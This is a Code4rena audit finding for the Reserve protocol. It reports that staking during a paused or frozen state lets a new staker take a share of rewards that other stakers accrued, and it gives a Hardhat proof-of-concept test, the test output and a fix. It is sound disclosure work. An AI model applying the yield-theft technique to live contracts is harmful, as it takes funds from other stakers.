## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- M-21

# [Loss of staking yield for stakers when another user stakes in pause/frozen state](https://github.com/code-423n4/2023-01-reserve-findings/issues/148) 

# Lines of code

https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L215


# Vulnerability details

### Details
It is possible for a user to steal the yield from other stakers by staking when the system is paused or frozen.

This is because staking is allowed while paused/frozen, but `_payoutRewards()` is not called during so. Staking rewards are not paid out to current stakers when a new staker stakes, so the new staker immediately gets a portion of the rewards, without having to wait for a reward period.
```sol
function stake(uint256 rsrAmount) external {
	require(rsrAmount > 0, "Cannot stake zero");
	
	if (!main.pausedOrFrozen()) _payoutRewards();
	...
}
```

### Proof of concept
A test case can be included in `ZZStRSR.test.ts` under 'Add RSR / Rewards':
```js
    it('Audit: Loss of staking yield for stakers when another user stakes in pause/frozen state', async () => {
      await rsr.connect(addr1).approve(stRSR.address, stake)
      await stRSR.connect(addr1).stake(stake)

      await advanceTime(Number(config.rewardPeriod) * 5)
      await main.connect(owner).pause()

      await rsr.connect(addr2).approve(stRSR.address, stake)
      await stRSR.connect(addr2).stake(stake)

      await main.connect(owner).unpause()

      await stRSR.connect(addr1).unstake(stake)
      await stRSR.connect(addr2).unstake(stake)
      await advanceTime(Number(config.unstakingDelay) + 1)

      await stRSR.connect(addr1).withdraw(addr1.address, 1)
      await stRSR.connect(addr2).withdraw(addr2.address, 1)
      const addr1RSR = await rsr.balanceOf(addr1.address)
      const addr2RSR = await rsr.balanceOf(addr2.address)
      console.log(`addr1 RSR = ${addr1RSR}`)
      console.log(`addr2 RSR = ${addr2RSR}`)
      expect(Number(addr1RSR)).to.be.approximately(Number(addr2RSR), 10)
    })
```
Note that `await advanceTime(Number(config.rewardPeriod) * 5)` can be before or after the pause, same result will occur

Run with:
`yarn test:p1 --grep "Audit"`

Output:
```shell
addr1 RSR = 10000545505689818061216
addr2 RSR = 10000545505689818061214

  StRSRP1 contract
    Add RSR / Rewards
      ✔ Audit: Loss of staking yield for stakers when another user stakes in pause/frozen state (1504ms)                                                                                       (1504ms)


  1 passing (2m)
```

The PoC demonstrates that the staker2 stole half of the rewards from staker1. staker1 staked for 5 `rewardPeriod`, staker2 did not have to wait at all, but still received half of the reward share.

### Impact
This should fall into "Theft of unclaimed yield", suggesting High risk. But the amount of RSR that can be stolen depends on the liveliness of the staking pool (how often `_payoutRewards()` is called). If the time window between the last `stake(...)/unstake(...)/payoutRewards(...)` and `pause()/freezeUntil(...)` is small, then no/less RSR yield can be stolen. 

`system-design.md` rewardPeriod:
```
Default value: `86400` = 1 day
Mainnet reasonable range: 10 to 31536000 (1 year)
```
For RTokens which choose a smaller value for `rewardPeriod`, the risk is higher. If `rewardPeriod = 86400` like recommended, then for this attack to occur, no one must have called `stake(...)/unstake(...)/payoutRewards(...)` for 1 day before the pause/freeze occured.

Likelihood is Low for a reasonably set `rewardPeriod` and lively project. Therefore submitting as Medium risk.

### Recommendations
I'm unsure of why staking is allowed when paused/frozen and the reason for the line:
```sol
 if (!main.pausedOrFrozen()) _payoutRewards();
```
The team should consider the reason for the above logic.

If the above logic is required, then I would suggest that `poke()` in `Main.sol` be called inside of `pause()` and `freezeUntil(...)` to update the state **before** pausing/freezing. Since `distribute(...)` has modifier `notPausedOrFrozen`, I would assume in pause/frozen state, no RSR is sent to stRSR contract(i.e. no rewards when paused/frozen) so this recommendation should be sufficient in preventing the issue.